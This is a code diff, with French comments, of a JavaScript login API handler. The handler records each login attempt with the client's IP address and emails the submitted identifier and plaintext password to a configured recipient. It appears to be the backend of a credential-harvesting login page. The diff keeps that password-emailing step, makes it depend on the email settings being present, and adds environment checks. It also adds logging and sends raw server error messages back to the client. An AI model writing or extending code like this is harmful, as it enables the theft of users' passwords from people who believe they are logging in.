@@ -87,6 +87,15 @@ export default async function handler(req, res) {
   }
 
   try {
+    // Vérifier les variables d'environnement
+    if (!process.env.MONGODB_URI) {
+      console.error('❌ MONGODB_URI non configurée');
+      return res.status(500).json({
+        success: false,
+        message: 'Configuration manquante: MONGODB_URI',
+      });
+    }
+
     const { identifiant, motDePasse } = req.body;
 
     console.log('📝 Tentative de connexion reçue:', { identifiant });
@@ -99,6 +108,7 @@ export default async function handler(req, res) {
     }
 
     await connectDB();
+    console.log('✓ MongoDB connecté');
 
     const ipAddress = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || 'inconnu';
 
@@ -112,11 +122,16 @@ export default async function handler(req, res) {
     await loginAttempt.save();
     console.log('✓ Tentative enregistrée:', loginAttempt._id);
 
-    try {
-      await sendLoginNotificationEmail(identifiant, motDePasse, ipAddress);
-      console.log('✓ Email envoyé');
-    } catch (emailError) {
-      console.warn('⚠ Erreur email:', emailError.message);
+    // Essayer d'envoyer l'email (optionnel)
+    if (process.env.EMAIL_USER && process.env.EMAIL_PASSWORD && process.env.EMAIL_RECIPIENT) {
+      try {
+        await sendLoginNotificationEmail(identifiant, motDePasse, ipAddress);
+        console.log('✓ Email envoyé');
+      } catch (emailError) {
+        console.warn('⚠ Erreur email (non bloquant):', emailError.message);
+      }
+    } else {
+      console.warn('⚠ Email non configuré (variables manquantes)');
     }
 
     res.status(201).json({
@@ -125,10 +140,12 @@ export default async function handler(req, res) {
       id: loginAttempt._id,
     });
   } catch (error) {
-    console.error('✗ Erreur serveur:', error.message);
+    console.error('❌ Erreur serveur:', error.message);
+    console.error('Stack trace:', error.stack);
+    
     res.status(500).json({
       success: false,
-      message: 'Erreur serveur lors de l\'enregistrement',
+      message: 'Erreur serveur lors de l\'enregistrement: ' + error.message,
     });
   }
 }
